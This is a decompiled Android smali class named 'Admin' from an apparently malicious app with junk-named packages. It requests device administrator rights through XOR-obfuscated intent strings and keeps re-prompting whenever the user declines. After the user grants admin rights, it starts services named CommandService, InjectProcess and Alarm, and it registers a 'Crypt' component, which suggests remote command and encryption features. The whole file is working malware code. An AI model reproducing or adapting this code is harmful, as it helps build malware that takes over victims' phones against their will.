.class public Lcompse/refact/st/upsssss/Admin;
.super Landroid/app/Activity;


# static fields
.field public static fsafsdfsfsdfsfsdfsd:Landroid/app/admin/DevicePolicyManager;

.field public static sdfsdfsdfsdf:Landroid/content/ComponentName;


# direct methods
.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method


# virtual methods
.method public fsafsdfsfsdfsfsdfsd()V
    .locals 3

    new-instance v0, Landroid/content/Intent;

    const-string v1, "\u001aG\u001f[\u0014@\u001f\u0007\u001aY\u000b\u0007\u001aJ\u000f@\u0014GUh?m$m>\u007f2j>v:m6`5"

    invoke-static {v1}, Lcompse/refact/st/upsssss/uiiliuluiiuluilulu;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    const-string v1, "0o5s>h5/0q!/4y%s0/\u0015D\u0007H\u0012D\u000e@\u0015L\u0018O"

    invoke-static {v1}, Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    sget-object v2, Lcompse/refact/st/upsssss/Admin;->sdfsdfsdfsdf:Landroid/content/ComponentName;

    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Landroid/os/Parcelable;)Landroid/content/Intent;

    const-string v1, "\u001aG\u001f[\u0014@\u001f\u0007\u001aY\u000b\u0007\u001eQ\u000f[\u001a\u0007:m?v>q+e:g:}2f5"

    invoke-static {v1}, Lcompse/refact/st/upsssss/uiiliuluiiuluilulu;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v2, "U>!$q5`%dqu9dqw4s\"h>o"

    invoke-static {v2}, Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const-string v1, "O\u0014[\u0018LVE\u0014J\u0010L\u001f"

    invoke-static {v1}, Lcompse/refact/st/upsssss/uiiliuluiiuluilulu;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const/4 v2, 0x3

    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;I)Landroid/content/Intent;

    const/16 v1, 0xe4

    :try_start_0
    invoke-virtual {p0, v0, v1}, Lcompse/refact/st/upsssss/Admin;->startActivityForResult(Landroid/content/Intent;I)V
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    return-void

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V

    goto :goto_0
.end method

.method protected onActivityResult(IILandroid/content/Intent;)V
    .locals 2

    invoke-super {p0, p1, p2, p3}, Landroid/app/Activity;->onActivityResult(IILandroid/content/Intent;)V

    const v0, 0x7fffffff

    if-eq p1, v0, :cond_0

    if-eqz p1, :cond_0

    const/16 v0, 0xe4

    if-ne p1, v0, :cond_0

    const/high16 v0, -0x80000000

    if-eq p2, v0, :cond_0

    if-eqz p1, :cond_0

    const/4 v0, -0x1

    if-ne p2, v0, :cond_1

    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcompse/refact/st/upsssss/CommandService;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v0}, Lcompse/refact/st/upsssss/Admin;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcompse/refact/st/upsssss/InjectProcess;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v0}, Lcompse/refact/st/upsssss/Admin;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcompse/refact/st/upsssss/Alarm;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v0}, Lcompse/refact/st/upsssss/Admin;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    invoke-virtual {p0}, Lcompse/refact/st/upsssss/Admin;->finish()V

    :cond_0
    :goto_0
    return-void

    :cond_1
    invoke-virtual {p0}, Lcompse/refact/st/upsssss/Admin;->fsafsdfsfsdfsfsdfsd()V

    goto :goto_0
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 2

    const-string v0, "e4w8b4^!n=h2x"

    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    invoke-static {v0}, Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0}, Lcompse/refact/st/upsssss/Admin;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/admin/DevicePolicyManager;

    sput-object v0, Lcompse/refact/st/upsssss/Admin;->fsafsdfsfsdfsfsdfsd:Landroid/app/admin/DevicePolicyManager;

    new-instance v0, Landroid/content/ComponentName;

    const-class v1, Lcompse/refact/st/upsssss/Crypt/CriptActivity;

    invoke-direct {v0, p0, v1}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    sput-object v0, Lcompse/refact/st/upsssss/Admin;->sdfsdfsdfsdf:Landroid/content/ComponentName;

    invoke-virtual {p0}, Lcompse/refact/st/upsssss/Admin;->fsafsdfsfsdfsfsdfsd()V

    return-void
.end method
